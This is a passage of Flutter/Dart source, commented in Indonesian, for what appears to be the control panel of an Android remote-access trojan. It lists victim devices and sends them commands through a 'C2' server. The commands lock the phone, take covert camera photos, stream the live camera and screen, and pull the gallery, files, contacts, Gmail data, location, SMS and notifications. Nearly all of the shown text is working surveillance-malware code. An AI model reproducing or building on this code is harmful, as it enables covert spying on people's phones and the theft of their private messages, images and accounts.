      _addLog("❌ Device ID tidak valid!", LogType.error);
      return;
    }
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key');
    if (token == null || token.isEmpty) {
      _addLog("❌ Token hilang! Login ulang.", LogType.error);
      if (mounted) Navigator.pushReplacementNamed(context, '/login');
      return;
    }

    setState(() => _isProcessing = true);
    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/command/$_targetId"),
        headers: {
          "Content-Type": "application/json",
          "x-auth-token": token,
        },
        body: jsonEncode({
          "command": command,
          "value": extra ?? "",
        }),
      );

      if (response.statusCode == 200) {
        _addLog("🚀 EXEC: $command", LogType.success);
      } else if (response.statusCode == 401) {
        _addLog("❌ Sesi kadaluarsa! Login ulang.", LogType.error);
        if (mounted) Navigator.pushReplacementNamed(context, '/login');
      } else {
        _addLog("❌ ERR: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ HTTP ERR: $e", LogType.error);
    } finally {
      if (mounted) setState(() => _isProcessing = false);
    }
  }

  // ─── DIALOG INPUT ────────────────────────────────────────────────────
  Future<String?> _showInputDialog({
    required String title,
    required String hint,
    String initialValue = '',
    bool multiline = false,
    TextInputType keyboardType = TextInputType.text,
  }) async {
    final controller = TextEditingController(text: initialValue);
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: _cardColor,
        title: Text(title, style: const TextStyle(color: Colors.white)),
        content: multiline
            ? TextField(
          controller: controller,
          maxLines: 10,
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: TextStyle(color: Colors.white54),
            border: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)),
            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)),
            focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.blueAccent)),
          ),
          style: const TextStyle(color: Colors.white),
        )
            : TextField(
          controller: controller,
          keyboardType: keyboardType,
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: TextStyle(color: Colors.white54),
            border: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)),
            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.white24)),
            focusedBorder: OutlineInputBorder(borderSide: BorderSide(color: Colors.blueAccent)),
          ),
          style: const TextStyle(color: Colors.white),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, null),
            child: const Text("BATAL", style: TextStyle(color: Colors.white54)),
          ),
          ElevatedButton(
            onPressed: () {
              final value = controller.text.trim();
              Navigator.pop(context, value);
            },
            child: const Text("KIRIM"),
          ),
        ],
      ),
    );
  }

  // ─── NAVIGASI TAB ──────────────────────────────────────────────────
  Widget _buildBottomNav() {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        border: Border(top: BorderSide(color: _glowColor1.withOpacity(0.1))),
      ),
      child: Padding(
        padding: const EdgeInsets.symmetric(vertical: 8, horizontal: 16),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceAround,
          children: [
            _buildNavItem(Icons.phone_android_outlined, "Devices", TabIndex.devices),
            _buildNavItem(Icons.settings_outlined, "Control", TabIndex.control),
            _buildNavItem(Icons.chat_bubble_outline, "Pesan", TabIndex.messages),
          ],
        ),
      ),
    );
  }

  Widget _buildNavItem(IconData icon, String label, TabIndex tab) {
    bool isActive = _currentTab == tab;
    return GestureDetector(
      onTap: () {
        setState(() {
          _currentTab = tab;
        });
      },
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
            decoration: isActive
                ? BoxDecoration(
              color: Colors.blue.withOpacity(0.2),
              borderRadius: BorderRadius.circular(20),
            )
                : null,
            child: Icon(
              icon,
              color: isActive ? Colors.blueAccent : Colors.grey,
              size: 26,
            ),
          ),
          const SizedBox(height: 4),
          Text(
            label,
            style: TextStyle(
              color: isActive ? Colors.blueAccent : Colors.grey,
              fontSize: 10,
              fontWeight: isActive ? FontWeight.bold : FontWeight.normal,
            ),
          ),
        ],
      ),
    );
  }

  // ─── BUILD TAB CONTENT ──────────────────────────────────────────────
  Widget _buildTabContent() {
    switch (_currentTab) {
      case TabIndex.devices:
        return _buildDevicesTab();
      case TabIndex.control:
        return _buildControlTab();
      case TabIndex.messages:
        return _buildMessagesTab();
    }
  }

  // ─── TAB: DEVICES ────────────────────────────────────────────────────
  Widget _buildDevicesTab() {
    return Column(
      children: [
        _buildDeviceHeader(),
        Expanded(
          child: _devices.isEmpty
              ? Center(child: Text("No Devices Found", style: TextStyle(color: Colors.white54)))
              : ListView.builder(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            itemCount: _devices.length,
            itemBuilder: (context, index) {
              final device = _devices[index];
              return _buildDeviceCard(device, index);
            },
          ),
        ),
      ],
    );
  }

  Widget _buildDeviceHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 16, 16, 8),
      child: Row(
        children: [
          Text(
            "DEVICES",
            style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold, letterSpacing: 2),
          ),
          const SizedBox(width: 8),
          Expanded(
            child: Container(
              height: 1,
              color: _glowColor1.withOpacity(0.3),
            ),
          ),
          const SizedBox(width: 8),
          Icon(Icons.help_outline, color: _glowColor2, size: 20),
        ],
      ),
    );
  }

  Widget _buildDeviceCard(dynamic device, int index) {
    final bool isActive = device['status'] != 'Offline';
    final Color statusColor = isActive ? Colors.green : Colors.red;
    final String displayName = device['name'] ?? device['model'] ?? 'Unknown Device';
    final int battery = device['battery'] ?? 0;
    final String androidVersion = device['androidVersion'] ?? 'Unknown';
    final int sdkVersion = device['sdkVersion'] ?? 0;
    final String number = (index + 1).toString().padLeft(2, '0');

    return GestureDetector(
      onTap: () {
        setState(() {
          _targetId = device['id']?.toString() ?? '';
          _targetModel = displayName;
          _deviceData = Map<String, dynamic>.from(device);
          _currentTab = TabIndex.control;
        });
        _addLog("🎯 Selected: $_targetModel", LogType.success);
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: _cardColor,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: _glowColor1.withOpacity(0.2)),
        ),
        child: Row(
          children: [
            Column(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: _surfaceColor,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _glowColor1.withOpacity(0.2)),
                  ),
                  child: Icon(Icons.phone_android, color: _glowColor1, size: 32),
                ),
                const SizedBox(height: 6),
                Row(
                  children: [
                    Icon(Icons.battery_charging_full, size: 12, color: battery > 20 ? Colors.green : Colors.red),
                    const SizedBox(width: 4),
                    Text(
                      "$battery%",
                      style: TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.bold),
                    ),
                  ],
                ),
              ],
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(displayName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
                  const SizedBox(height: 4),
                  Text(
                    "Android $androidVersion - SDK $sdkVersion",
                    style: TextStyle(color: Colors.white54, fontSize: 12),
                  ),
                ],
              ),
            ),
            Column(
              crossAxisAlignment: CrossAxisAlignment.end,
              children: [
                Container(
                  width: 10,
                  height: 10,
                  decoration: BoxDecoration(
                    color: statusColor,
                    shape: BoxShape.circle,
                  ),
                ),
                const SizedBox(height: 8),
                Text(
                  number,
                  style: TextStyle(color: _glowColor2, fontSize: 12),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ─── TAB: CONTROL ──────────────────────────────────────────────────────
  Widget _buildControlTab() {
    if (_targetId == "unknown") {
      return Center(
        child: Text(
          "PILIH DEVICE DULU CUY!",
          style: TextStyle(color: Colors.white54, fontSize: 18, fontWeight: FontWeight.bold),
        ),
      );
    }

    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          _buildDeviceInfoCard(),
          const SizedBox(height: 20),
          const Text(
            "REMOTE KONTROL",
            style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold, letterSpacing: 2),
          ),
          const SizedBox(height: 8),
          Text(
            "KONTROL",
            style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1),
          ),
          const SizedBox(height: 16),
          // .ctrl-grid: 2 kolom, gap 10px. Memakai Row/Expanded (bukan GridView)
          // supaya tinggi tile mengikuti konten (min-height:110px dari HTML),
          // mencegah overflow teks pada layar kecil.
          _buildCtrlGrid(),
          const SizedBox(height: 20),
          _buildTerminalLogs(),
          const SizedBox(height: 20),
          _buildControlFooter(),
        ],
      ),
    );
  }

  // ══════════════════════════════════════════════════════════════════════
  //  NEO-BRUTALIST TILE STYLE  —  CSS 1:1 PORT
  //  Sumber: design.html  →  .ctrl-tile / .tile-icon / .tile-name / .tile-sub
  //  background:#facc15 ; border-radius:0 ; border 2px top/left, 5px right/bottom #000
  //  padding 14/13/13 ; min-height 110 ; gap 10 ; hover:#eab308 + translate(-2,-2)
  // ══════════════════════════════════════════════════════════════════════

  // Warna dasar kartu (yellow neo-brutalist)
  static const Color _tileBg = Color(0xFFFACC15);
  static const Color _tileBgHover = Color(0xFFEAB308);
  static const Color _tileBorder = Color(0xFF000000);

  // ─── SATU TILE (dipakai toggle & aksi) ───────────────────────────────
  // iconColor = warna kotak ikon (solid bg + glyph putih), sama spt .ti-* di HTML
  Widget _buildNeoTile({
    required String label,
    required String sub,
    required IconData icon,
    required Color iconColor,
    required VoidCallback? onTap,
    Widget? trailing, // switch / elemen kanan
    bool showTrailing = true,
  }) {
    return _NeoCtrlTile(
      label: label,
      sub: sub,
      icon: icon,
      iconColor: iconColor,
      onTap: onTap,
      trailing: trailing,
      showTrailing: showTrailing,
      bg: _tileBg,
      bgHover: _tileBgHover,
      border: _tileBorder,
    );
  }

  // ─── KARTU TOGGLE ────────────────────────────────────────────────────
  Widget _buildToggleCard({
    required String label,
    required IconData icon,
    required Color color,
    required bool isOn,
    required bool needsInput,
    required String inputHint,
    required String inputType,
    required String command,
    String? offCommand,
    String sub = '',
  }) {
    // sub dinamis: ganti ● / ○ sesuai status, sisanya ambil dari metadata
    String subText = sub;
    if (subText.contains('●') && subText.contains('○')) {
      final offPart = subText.split('/').length > 1
          ? subText.split('/')[1].replaceAll('●', '').trim()
          : 'NONAKTIF';
      subText = isOn ? subText.split('/')[0].trim() : '○ $offPart';
    } else if (subText.isEmpty) {
      subText = isOn ? "● AKTIF" : "○ NONAKTIF";
    }

    return _buildNeoTile(
      label: label,
      sub: subText,
      icon: icon,
      iconColor: color,
      onTap: () => _toggleTile(
        command: command,
        currentValue: isOn,
        label: label,
        needsInput: needsInput,
        inputHint: inputHint,
        inputType: inputType,
        offCommand: offCommand,
      ),
      trailing: _buildNeoSwitch(
        value: isOn,
        onChanged: (bool value) => _toggleTile(
          command: command,
          currentValue: isOn,
          label: label,
          needsInput: needsInput,
          inputHint: inputHint,
          inputType: inputType,
          offCommand: offCommand,
          forceValue: value,
        ),
      ),
    );
  }

  // ─── LOGIKA TOGGLE (dipisah agar dipakai tap area & switch) ──────────
  Future<void> _toggleTile({
    required String command,
    required bool currentValue,
    required String label,
    required bool needsInput,
    required String inputHint,
    required String inputType,
    String? offCommand,
    bool? forceValue,
  }) async {
    final bool value = forceValue ?? !currentValue;

    if (value == true) {
      // ── MENYALAKAN ──
      if (needsInput) {
        final input = await _showInputDialog(
          title: "Input untuk $label",
          hint: inputHint,
          multiline: inputType == 'multiline',
          keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
        );
        if (input == null) return;
        _sendCommand(command, extra: input);
      } else {
        _sendCommand(command, extra: 'true');
      }
      setState(() => _updateControlItemState(command, true));
    } else {
      // ── MEMATIKAN ──
      final offCmd = offCommand ??
          (command == 'lockDevice' || command == 'lockCustom' ? 'unlockDevice' : command);
      _sendCommand(offCmd, extra: offCommand != null ? '' : 'false');
      setState(() => _updateControlItemState(command, false));
    }
  }

  // ─── GRID KONTROL (.ctrl-grid 2 kolom, gap 10) ────────────────────────
  Widget _buildCtrlGrid() {
    final List<Widget> tiles = _controlItems.map((item) {
      if (item['isToggle'] == true) {
        return _buildToggleCard(
          label: item['label'],
          icon: item['icon'],
          color: item['color'],
          isOn: item['isOn'] ?? false,
          needsInput: item['needsInput'] ?? false,
          inputHint: item['inputHint'] ?? '',
          inputType: item['inputType'] ?? 'text',
          command: item['command'],
          offCommand: item['offCommand'],
          sub: item['sub'] ?? '',
        );
      }
      return _buildActionCard(
        label: item['label'],
        icon: item['icon'],
        color: item['color'],
        sub: item['sub'] ?? 'TAP',
        onTap: () => _handleActionTap(item),
      );
    }).toList();

    // Susun jadi baris 2 kolom; tiap sel dibungkus IntrinsicHeight agar
    // dua tile bersebelahan sama tinggi (perilaku CSS grid 1fr 1fr).
    final List<Widget> rows = [];
    for (int i = 0; i < tiles.length; i += 2) {
      final left = tiles[i];
      final right = i + 1 < tiles.length ? tiles[i + 1] : null;
      rows.add(
        IntrinsicHeight(
          child: Row(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Expanded(child: left),
              const SizedBox(width: 10),
              Expanded(
                child: right ?? const SizedBox.shrink(),
              ),
            ],
          ),
        ),
      );
      rows.add(const SizedBox(height: 10));
    }
    if (rows.isNotEmpty) rows.removeLast(); // buang spacer terakhir
    return Column(children: rows);
  }

  // ─── SWITCH NEO (.sw-track: off #e2e8f0 / on #0a0a0a, knob 14px) ──────
  Widget _buildNeoSwitch({required bool value, required ValueChanged<bool> onChanged}) {
    return GestureDetector(
      onTap: () => onChanged(!value),
      child: Container(
        width: 42, // .sw width:42px
        height: 22, // .sw height:22px
        decoration: BoxDecoration(
          color: value ? const Color(0xFF0A0A0A) : const Color(0xFFE2E8F0),
          borderRadius: BorderRadius.circular(999),
          border: Border.all(
            color: value ? const Color(0xFF0A0A0A) : const Color(0xFFD1D5DB),
            width: 1,
          ),
          // .sw input:checked + .sw-track{ box-shadow:0 0 16px rgba(0,0,0,.3) }
          boxShadow: value
              ? const [BoxShadow(color: Color(0x4D000000), blurRadius: 8, spreadRadius: 0)]
              : const [BoxShadow(color: Color(0x0A000000), blurRadius: 3, offset: Offset(0, 2))],
        ),
        child: AnimatedAlign(
          duration: const Duration(milliseconds: 220), // transition:left .22s
          curve: Curves.easeOut,
          alignment: value ? Alignment.centerRight : Alignment.centerLeft,
          child: Container(
            // .sw-track::after{ top:3px;left:3px; width:14px;height:14px }
            width: 14,
            height: 14,
            margin: const EdgeInsets.symmetric(horizontal: 4), // 3px + 1px border
            decoration: const BoxDecoration(
              color: Colors.white,
              shape: BoxShape.circle,
              boxShadow: [
                BoxShadow(color: Color(0x1F000000), blurRadius: 4, offset: Offset(0, 1)),
              ],
            ),
          ),
        ),
      ),
    );
  }

  // ─── KARTU AKSI ──────────────────────────────────────────────────────
  Widget _buildActionCard({
    required String label,
    required IconData icon,
    required Color color,
    required VoidCallback onTap,
    String sub = "TAP",
  }) {
    return _buildNeoTile(
      label: label,
      sub: sub,
      icon: icon,
      iconColor: color,
      onTap: onTap,
      showTrailing: true, // action tile pakai chevron › (seperti .tile-tap di HTML)
    );
  }

  // ─── HANDLE AKSI TAP ─────────────────────────────────────────────────
  void _handleActionTap(Map<String, dynamic> item) async {
    final command = item['command'];
    final needsInput = item['needsInput'] ?? false;
    final inputHint = item['inputHint'] ?? '';
    final inputType = item['inputType'] ?? 'text';
    final extra = item['extra'] ?? '';

    // ── HANDLE COMMAND KHUSUS ──
    if (command == "camera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _takeScreenshotViaRest(facing);
      return;
    }
    if (command == "liveCamera") {
      final facing = extra.isNotEmpty ? extra : "front";
      _startLiveCameraPolling(facing);
      return;
    }
    if (command == "stopCamera") {
      _sendCommand('camera', extra: 'stop');
      _addLog("📷 Stop camera command sent", LogType.info);
      if (_cameraModalVisible) _closeCameraModal();
      return;
    }
    if (command == "stopScreen") {
      _sendCommand('screen', extra: 'stop');
      _addLog("🖥️ Stop screen command sent", LogType.info);
      if (_screenModalVisible) _closeScreenModal();
      return;
    }

    // ── LIVE SCREEN CONTROL (buka modal kontrol layar) ──
    if (command == "openLiveControl") {
      _addLog("🖥️ Live Screen Control — membuka sesi kontrol layar", LogType.info);
      _openScreenModal();
      return;
    }

    // ── SCREEN CAPTURE (foto layar saat ini) ──
    if (command == "photoScreen") {
      _sendCommand('screenCapture', extra: '');
      _addLog("📸 Screen Capture — request terkirim", LogType.info);
      return;
    }

    // ── PENGAMBILAN DATA (galeri / file / kontak / gmail / phone / lokasi) ──
    //  Tiap tombol memanggil dialog/data-viewer yang sesuai (sudah tersedia).
    switch (command) {
      case "getGallery":
        _showGalleryDialog();
        return;
      case "getFiles":
        _showFileManagerDialog();
        return;
      case "getContacts":
        _showContactsDialog();
        return;
      case "getGmail":
        _showGmailDialog();
        return;
      case "getLocation":
        _showLocationDialog();
        return;
      case "getPhone":
        _sendCommand('getPhone', extra: extra);
        _addLog("📞 Mengambil info nomor HP...", LogType.info);
        return;
    }

    // ── COMMAND BIASA ──
    if (needsInput) {
      final input = await _showInputDialog(
        title: "Input untuk ${item['label']}",
        hint: inputHint,
        multiline: inputType == 'multiline',
        keyboardType: inputType == 'number' ? TextInputType.number : TextInputType.text,
        initialValue: extra,
      );
      if (input == null) return;
      _sendCommand(command, extra: input);
    } else {
      _sendCommand(command, extra: extra);
    }
  }

  // ─── WIDGET DEVICE INFO CARD ────────────────────────────────────────
  Widget _buildDeviceInfoCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _glowColor1.withOpacity(0.15)),
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              color: _surfaceColor,
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: _glowColor1.withOpacity(0.2)),
            ),
            child: const Icon(Icons.phone_android, color: Colors.white, size: 30),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      width: 8,
                      height: 8,
                      decoration: const BoxDecoration(
                        color: Colors.green,
                        shape: BoxShape.circle,
                      ),
                    ),
                    const SizedBox(width: 6),
                    const Text(
                      "ONLINE",
                      style: TextStyle(
                        color: Colors.green,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 4),
                Text(
                  _targetModel,
                  style: const TextStyle(
                    color: Colors.white,
                    fontSize: 18,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  "Android 14 R   Bat ${_deviceData['battery'] ?? 0}%   Tema default",
                  style: TextStyle(
                    color: Colors.white.withOpacity(0.5),
                    fontSize: 12,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── TAB: MESSAGES ────────────────────────────────────────────────────
  Widget _buildMessagesTab() {
    if (_targetId == "unknown") {
      return Center(
        child: Text(
          "PILIH DEVICE DULU!",
          style: TextStyle(color: Colors.white54, fontWeight: FontWeight.bold),
        ),
      );
    }

    return Column(
      children: [
        _buildMessageHeader(),
        Expanded(
          child: _smsData.isEmpty && _notifData.isEmpty
              ? Center(
            child: Text(
              "Belum ada pesan. Tap refresh!",
              style: TextStyle(color: Colors.white54),
            ),
          )
              : ListView(
            padding: const EdgeInsets.all(16),
            children: [
              if (_smsData.isNotEmpty) ...[
                Text("SMS", style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold, fontSize: 14)),
                const SizedBox(height: 8),
                ...(_smsData['status']?['smsList'] as List? ?? []).map((app) => _buildMessageItem(app, 'SMS')),
              ],
              if (_notifData.isNotEmpty) ...[
                const SizedBox(height: 20),
                Text("NOTIFIKASI", style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold, fontSize: 14)),
                const SizedBox(height: 8),
                ...(_notifData['status']?['notifList'] as List? ?? []).map((app) => _buildMessageItem(app, 'NOTIF')),
              ],
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildMessageHeader() {
    return Container(
      padding: const EdgeInsets.all(16),
      child: Row(
        children: [
          Text("PESAN & NOTIFIKASI", style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold, letterSpacing: 2)),
          const Spacer(),
          ElevatedButton.icon(
            onPressed: () {
              _sendCommand('getSms');
              _sendCommand('getNotifs');
              _addLog("🔄 Refresh SMS & Notif", LogType.info);
            },
            icon: const Icon(Icons.refresh, size: 16),
            label: const Text("REFRESH"),
            style: ElevatedButton.styleFrom(
              backgroundColor: _glowColor1.withOpacity(0.2),
              foregroundColor: _glowColor1,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMessageItem(dynamic app, String type) {
    final messages = app['messages'] as List? ?? [];
    final appName = app['appName'] ?? 'Unknown';
    final count = messages.length;
    final preview = messages.isNotEmpty ? (messages.first['text'] ?? '').toString() : '';

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: Colors.white10),
      ),
      child: Row(
        children: [
          Container(
            width: 40,
            height: 40,
            decoration: BoxDecoration(
              color: Colors.white10,
              borderRadius: BorderRadius.circular(10),
            ),
            child: Center(child: Text(appName[0].toUpperCase(), style: const TextStyle(color: Colors.white))),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(appName, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                Text(preview, style: TextStyle(color: Colors.white54, fontSize: 12), maxLines: 1, overflow: TextOverflow.ellipsis),
              ],
            ),
          ),
          Text("$count", style: TextStyle(color: _glowColor1, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  // ─── TERMINAL LOGS ──────────────────────────────────────────────────
  Widget _buildTerminalLogs() {
    return Container(
      height: 120,
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: _isConnected ? _successColor.withOpacity(0.3) : _roseColor.withOpacity(0.3)),
      ),
      child: ListView.builder(
        controller: _logScrollController,
        reverse: true,
        padding: const EdgeInsets.all(10),
        itemCount: _executionLogs.length,
        itemBuilder: (context, i) {
          final log = _executionLogs[_executionLogs.length - 1 - i];
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 2),
            child: Row(
              children: [
                Text("[${_formatTime(log.timestamp)}]", style: TextStyle(color: Colors.grey[600], fontSize: 10)),
                const SizedBox(width: 8),
                Expanded(child: Text(log.message, style: TextStyle(color: _getLogColor(log.type), fontSize: 11))),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildControlFooter() {
    return Text(
      "SYSTEM SECURED • C2 CONNECTED",
      style: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 10, letterSpacing: 2),
      textAlign: TextAlign.center,
    );
  }

  // ─── TAKE SCREENSHOT VIA REST ──────────────────────────────────────
  Future<void> _takeScreenshotViaRest(String facing) async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key') ?? '';
    
    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _addLog("📷 Taking screenshot via REST ($facing)", LogType.info);

    // Tampilkan loading
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.9),
            borderRadius: BorderRadius.circular(20),
          ),
          child: const Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              SizedBox(
                width: 40,
                height: 40,
                child: CircularProgressIndicator(
                  color: Colors.white54,
                  strokeWidth: 3,
                ),
              ),
              SizedBox(height: 16),
              Text(
                "MENGAMBIL FOTO...",
                style: TextStyle(
                  color: Colors.white54,
                  fontSize: 12,
                  letterSpacing: 2,
                ),
              ),
            ],
          ),
        ),
      ),
    );

    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/screenshot/$_targetId?facing=$facing"),
        headers: {"x-auth-token": token},
      );
      
      if (mounted) Navigator.pop(context);
      
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          _addLog("📸 Screenshot via REST berhasil", LogType.success);
          
          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (context) => ScreenshotResultPage(
                targetModel: _targetModel,
                screenshotFrame: data['frame'],
                screenshotFacing: facing,
                onClose: () {
                  Navigator.pop(context);
                },
              ),
              fullscreenDialog: true,
            ),
          );
        } else {
          _addLog("❌ Screenshot REST: frame kosong", LogType.error);
        }
      } else {
        _addLog("❌ Screenshot REST gagal: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      if (mounted) Navigator.pop(context);
      _addLog("⚠️ Screenshot REST error: $e", LogType.error);
    }
  }

  // ─── CAMERA SOCKET METHODS ──────────────────────────────────────────

  /// Mengambil foto tunggal via socket
  void _takeCameraSocket(String facing) {
    if (_isWaitingForPhoto) {
      _addLog("⚠️ Masih menunggu foto sebelumnya", LogType.warning);
      return;
    }
    setState(() {
      _isWaitingForPhoto = true;
      _cameraFacing = facing;
    });
    _sendCommand('camera', extra: facing);
    _addLog("📸 Mengambil foto ($facing) via socket", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        _photoLoadingContext = context;
        return const Center(
          child: Card(
            color: Colors.black87,
            child: Padding(
              padding: EdgeInsets.all(24.0),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  SizedBox(width: 40, height: 40, child: CircularProgressIndicator(color: Colors.white54)),
                  SizedBox(height: 16),
                  Text("MENGAMBIL FOTO...", style: TextStyle(color: Colors.white54, fontSize: 12, letterSpacing: 2)),
                ],
              ),
            ),
          ),
        );
      },
    );

    Future.delayed(Duration(seconds: 10), () {
      if (_isWaitingForPhoto && mounted) {
        _isWaitingForPhoto = false;
        if (_photoLoadingContext != null) {
          try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
          _photoLoadingContext = null;
        }
        _addLog("⚠️ Timeout mengambil foto", LogType.warning);
      }
    });
  }

  /// Live camera via socket
  void _startLiveCameraSocket(String facing) {
    if (_screenModalVisible) _closeScreenModal();
    if (_screenshotResultVisible) _closeScreenshotResult();

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _sendCommand('liveCamera', extra: facing);
    _addLog("📷 Starting live camera ($facing) via socket", LogType.info);

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          frameStream: _cameraFrameStreamController.stream,
          isLoading: _cameraLoading,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            _sendCommand('liveCamera', extra: newFacing);
            setState(() => _cameraFacing = newFacing);
          },
          onCapture: () {
            _takeCameraSocket(_cameraFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  // ─── LIVE CAMERA VIA REST (POLLING) ──────────────────────────────
  Future<void> _startLiveCameraPolling(String facing) async {
    if (_screenModalVisible) {
      _closeScreenModal();
    }
    if (_screenshotResultVisible) {
      _closeScreenshotResult();
    }

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _addLog("📷 Starting live camera polling ($facing)", LogType.info);

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPollingPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            setState(() => _cameraFacing = newFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  // ─── SCREEN MODAL ──────────────────────────────────────────────────
  void _openScreenModal() {
    setState(() {
      _screenFrame = '';
      _screenLoading = true;
      _screenModalVisible = true;
    });
    _sendCommand('screen', extra: 'start');
    _addLog("🖥️ Opening screen stream", LogType.info);
  }

  void _closeScreenModal() {
    setState(() {
      _screenModalVisible = false;
      _screenFrame = '';
      _screenLoading = true;
    });
    _sendCommand('screen', extra: 'stop');
    _addLog("🖥️ Screen stream closed", LogType.info);
  }

  void _closeCameraModal() {
    setState(() {
      _cameraModalVisible = false;
      _cameraFrame = '';
      _cameraLoading = true;
    });
    _sendCommand('camera', extra: 'stop');
    _addLog("📷 Camera stream closed", LogType.info);
  }

  Widget _buildScreenModal() {
    if (!_screenModalVisible) return const SizedBox.shrink();
    return Stack(
      children: [
        Container(
          color: Colors.black,
          width: double.infinity,
          height: double.infinity,
        ),
        if (_screenFrame.isNotEmpty)
          Center(
            child: InteractiveViewer(
              minScale: 0.5,
              maxScale: 3.0,
              child: Image.memory(
                base64Decode(_screenFrame.split(',').last),
                fit: BoxFit.contain,
                width: double.infinity,
                height: double.infinity,
                errorBuilder: (context, error, stackTrace) {
                  return const Center(
                    child: Text(
                      "Loading screen...",
                      style: TextStyle(color: Colors.white54),
                    ),
                  );
                },
              ),
            ),
          )
        else
          const Center(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                SizedBox(
                  width: 50,
                  height: 50,
                  child: CircularProgressIndicator(
